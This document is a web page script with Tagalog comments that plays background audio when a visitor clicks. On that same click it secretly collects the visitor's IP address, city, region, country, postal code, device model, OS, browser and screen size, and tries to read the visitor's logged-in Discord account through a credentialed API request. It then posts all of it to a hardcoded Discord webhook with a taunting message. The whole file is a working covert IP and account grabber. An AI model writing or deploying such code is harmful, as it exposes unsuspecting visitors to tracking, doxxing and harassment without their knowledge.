    <script>
        const audio = document.getElementById('bgSound');
        audio.volume = 0.4;

        // ✅ Webhook - HINDI BINAGO
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";

        // ✅ Click action - HINDI BINAGO
        document.addEventListener('click', () => {
            audio.play().catch(err => console.log("Audio error:", err));
            const overlay = document.getElementById('blahOverlay');
            setTimeout(() => overlay.classList.add('fade-out'), 100);
            sendVisitorInfo();
        }, { once: true });

        // ✅ Logger: TANGGAL LANG ANG LANG, LAGAY LOKASYON AT ZIP CODE
        async function sendVisitorInfo() {
            try {
                // Kumuha ng IP at lokasyon
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                const visitorIP = geoData.ip || "Hindi makuha";
                const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "?"}`;
                const zipCode = geoData.postal || "Hindi available";

                const ua = navigator.userAgent;

                // Browser
                let browser = "Unknown";
                if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
                else if (ua.includes("Firefox")) browser = "Firefox";
                else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
                else if (ua.includes("Edg")) browser = "Edge";
                else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";

                // Device at OS
                let device = "Android Device";
                let os = "Android 10";
                if (ua.includes("Android")) {
                    const osMatch = ua.match(/Android\s([0-9.]+)/);
                    if (osMatch) os = `Android ${osMatch[1]}`;
                    if (ua.includes("SM-")) device = ua.match(/SM-[A-Z0-9]+/) ? `Samsung ${ua.match(/SM-[A-Z0-9]+/)[0]}` : "Samsung";
                    else if (ua.includes("CPH")) device = ua.match(/CPH[0-9]+/) ? `Oppo ${ua.match(/CPH[0-9]+/)[0]}` : "Oppo";
                    else if (ua.includes("Redmi")) device = ua.match(/Redmi\s?[0-9A-Z]+/) ? `Xiaomi ${ua.match(/Redmi\s?[0-9A-Z]+/)[0]}` : "Xiaomi Redmi";
                    else if (ua.includes("POCO")) device = ua.match(/POCO\s?[0-9A-Z]+/) ? `Xiaomi ${ua.match(/POCO\s?[0-9A-Z]+/)[0]}` : "Xiaomi POCO";
                    else if (ua.includes("Vivo")) device = ua.match(/V[0-9]+/) ? `Vivo ${ua.match(/V[0-9]+/)[0]}` : "Vivo";
                    else if (ua.includes("Infinix")) device = ua.match(/X[0-9]+/) ? `Infinix ${ua.match(/X[0-9]+/)[0]}` : "Infinix";
                    else if (ua.includes("Tecno")) device = ua.match(/KI[0-9]+/) ? `Tecno ${ua.match(/KI[0-9]+/)[0]}` : "Tecno";
                    else if (ua.includes("RMX")) device = ua.match(/RMX[0-9]+/) ? `Realme ${ua.match(/RMX[0-9]+/)[0]}` : "Realme";
                } else if (ua.includes("iPhone")) {
                    device = "Apple iPhone";
                    const iosMatch = ua.match(/iPhone OS\s([0-9_]+)/);
                    os = iosMatch ? `iOS ${iosMatch[1].replace("_", ".")}` : "iOS";
                } else if (ua.includes("Windows")) {
                    device = "Windows PC";
                    const winMatch = ua.match(/Windows NT\s([0-9.]+)/);
                    os = winMatch ? `Windows ${winMatch[1]}` : "Windows";
                }

                // Discord info
                let accountInfo = "Walang naka-detect na Discord account";
                try {
                    const discordRes = await fetch("https://discord.com/api/v9/users/@me", {
                        credentials: "include",
                        headers: { "Accept": "application/json" }
                    });
                    if (discordRes.ok) {
                        const userData = await discordRes.json();
                        accountInfo = `@${userData.username}\nID: ${userData.id}\nProfile: https://discord.com/users/${userData.id}`;
                    }
                } catch (e) {}

                // ✅ Bagong ayos ng fields
                const payload = {
                    username: "BOBO KA TOL",
                    avatar_url: "https://i.imgur.com/ZmspxIl.png",
                    embeds: [{
                        title: "BLAH WAS HERE",
                        color: 1003621,
                        fields: [
                            { name: "IP ADDRESS", value: visitorIP, inline: false },
                            { name: "LOCATION", value: realLocation, inline: true },
                            { name: "ZIP CODE", value: zipCode, inline: true },
                            { name: "DEVICE", value: device, inline: true },
                            { name: "OPERATING SYSTEM", value: os, inline: true },
                            { name: "BROWSER", value: browser, inline: true },
                            { name: "SCREEN", value: `${window.innerWidth} × ${window.innerHeight}`, inline: true },
                            { name: "ACCOUNT", value: accountInfo, inline: false }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: { text: "THE WORLD IS YOUR." }
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

            } catch (err) {
                console.log("Error:", err);
            }
        }
    </script>
